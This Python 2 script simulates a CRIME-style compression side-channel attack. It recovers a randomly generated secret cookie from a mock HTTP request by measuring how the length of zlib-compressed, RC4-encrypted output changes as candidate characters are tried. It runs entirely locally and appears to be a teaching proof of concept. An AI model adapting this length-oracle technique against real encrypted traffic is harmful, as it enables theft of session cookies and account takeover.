import string
import zlib
import sys
import random
from Crypto.Cipher import ARC4

formatCharacters = string.letters + string.digits #Possible characters found in the token
secret_cookie = ''.join(random.choice(formatCharacters) for x in range(30)) #Generate a random token for each test
KEY = ''.join(random.sample(string.ascii_uppercase + string.digits, k=17)) #define a random key for encryption

#Define the known headers and body of the request.
HEADERS = ("POST / HTTP/1.1\r\n"
       "Host: someinsecureserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)\r\n"
           "Accept: */*\r\n"
           "Referer: https://someinsecureserver.com/\r\n"
           "Cookie: secret=" + secret_cookie +  "\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-formatCharacters: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

BODY = ("POST / HTTP/1.1\r\n"
           "Host: someinsecureserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)\r\n"
           "Accept: */*\r\n"
           "Referer: https://someinsecureserver.com/\r\n"
           "Cookie: secret="
         )

BODY_SUFFIX=("\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-formatCharacters: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")

cookie = ""

#define functions to simulate TLS encryption and compression
def compress(data):
    c = zlib.compressobj()
    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)

def encrypt(msg):
    data = msg
    cipher = ARC4.new(KEY)
    return cipher.encrypt( zlib.compress(data) )

def decrypt(enc):
    decipher = ARC4.new(KEY)
    return decipher.decrypt( zlib.decompress(enc) )


def findnextchar(body,body_suffix,formatCharacters):
    baselen = len(encrypt(compress(HEADERS + body + body_suffix)))
    possible_chars = []
    for c in formatCharacters:
        length = len(encrypt(compress(HEADERS + body + c + body_suffix)))
        if length <= baselen:
            possible_chars.append(c)
    return possible_chars

def exit():
    print "Original cookie: %s" % secret_cookie
    print "Found cookie  : %s" % cookie
    sys.exit(1)

def forward():
    global cookie
    while len(cookie) < len(secret_cookie):
        chop = 1
        possible_chars = findnextchar(BODY + cookie, "", formatCharacters)
        body_tmp = BODY
        orig = possible_chars
        while not len(possible_chars) == 1:
            if len(body_tmp) < chop:
                return False

            body_tmp = body_tmp[chop:]
            possible_chars = findnextchar(body_tmp + cookie, "", orig)
        cookie = cookie + possible_chars[0]
    return True

while BODY.find("\r\n") >= 0:
    if not forward():
        cookie = cookie[:-1]
    if len(cookie) >= len(secret_cookie):
        exit()
    print "reducing body"
    BODY = BODY[BODY.find("\r\n") + 2:]

exit()
